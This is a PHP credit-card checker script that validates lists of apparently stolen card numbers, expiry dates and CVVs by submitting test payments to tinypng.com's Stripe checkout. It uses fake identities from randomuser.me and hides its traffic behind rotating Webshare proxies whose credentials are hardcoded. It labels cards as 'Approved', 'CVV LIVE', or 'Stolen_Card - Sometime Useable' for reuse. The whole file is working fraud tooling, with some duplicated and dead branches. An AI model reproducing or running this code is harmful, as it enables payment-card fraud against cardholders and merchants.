<?php
/////////////////====== Made By Matthew ===============\\\\\\\\\\\\\\\\\\\\\


/////Site https://tinypng.com/web/pro
include 'function.php';

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
if(file_exists(getcwd().('/cookie.txt'))){
@unlink('cookie.txt');
}


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

function proxys()
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$proxy = proxys(); 
//$ip = multiexplode(array(":", "|", ""), $proxy)[0]; 
//echo '[ IP: '.$ip.' ] ';

if(strlen($ano) == 4){
$ano = substr($ano, 2);
};

///////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
$serve_arr = array("gmail.com","hotmail.com","orange.fr","n0xrub.design","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);


//////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'ugxadahj-rotate:od0skge92utj',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
//$ip = $ip1;
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////

#------------------------------------------Site----------------------------------------------------#

$ch = curl_init();
//curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://tinypng.com/web/pro'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: tinypng.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'content-type: application/json',
'cookie: _ga=GA1.2.1420216755.1600720176; _gid=GA1.2.1946680434.1600720176; _gat=1; __stripe_mid=1947d35a-f809-4c22-a70e-b0dc618d13dac2fd1b; __stripe_sid=1979bc2b-4aac-4cd3-a062-b3b7edc5666e3dc476',
'origin: https://tinypng.com',
'referer: https://tinypng.com/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"quantity":1,"paymentMethod":"stripe","fullName":"'.$name.'","mail":"'.$email.'","cardNumber":"'.$cc.'","cardExpMonth":"'.$mes.'","cardExpYear":"'.$ano.'","cardCvc":"'.$cvv.'"}');
$result = curl_exec($ch);
$message = trim(strip_tags(getstr($result,'"message":"','"'))); 


/////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);

      
/////////////////[Responses]///////////////

if(strpos($result, 'Thank you for your support!' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED: CHARGED Successfully 0.01$ 『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"/wishlist-member/?reg=")){
    echo '<span class="badge badge-white">#Approved</span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">『 ★ APPROVED [Successfully CHARGED. The site has passed!] ★ 』</span> </b></br> <span class="badge badge-white">『 Beast ⚡ 』</span></br>';
}
elseif(strpos($result,"https://betracingnationclub.com/?/register/continue&to=")){
    echo '<span class="badge badge-white">#Approved </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ APPROVED[Successfully CHARGED. The site has passed!] ★ 』 </span> </b></br> <span class="badge badge-white">『 Matthew 』</span></br>';
}
elseif(strpos($result,'The zip code you supplied failed validation.')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 Matthew 』</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Thank You." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 Matthew 』</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,'"status": "succeeded"')){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 Matthew 』 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_zip" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 Matthew 』  )」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Success" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "succeeded." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Fraudulent Card 『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent",)){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★FRAUDULENT CARD - Sometime Useable 『 Matthew 』」  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Insufficient Funds  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "insufficient_funds")) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Insufficient Funds  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "lost_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Lost_Card - Sometime Useable  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "stolen_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Stolen_Card - Sometime Useable  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your+cards+security+code+is+incorrect.' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Pickup Card (Reported Stolen Or Lost) 『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 Matthew 』  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 Matthew 』 ♛  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "pickup_card" )) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Pickup Card (Reported Stolen Or Lost) 『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "expired_card" )) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result, 'Your+card+number+is+incorrect.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Incorrect Card Number  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Incorrect Card Number  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Do_Not_Honor  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 Matthew 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your+card+was+declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 Matthew 』 ♛  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-success">#Approved</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 Matthew 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"missing_payment_information")){
     '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Missing Payment Informations 『 Matthew 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Credit Card Number」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined: Message: ['.$message.'] ★ 『 Matthew 』 」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
curl_close($ch);
ob_flush();
//echo "<b>1REQ result:</b> $result<br><br>";
/////////////////====== Hecho por Matthew ===============\\\\\\\\\\\\\\\\\\\\\

?>
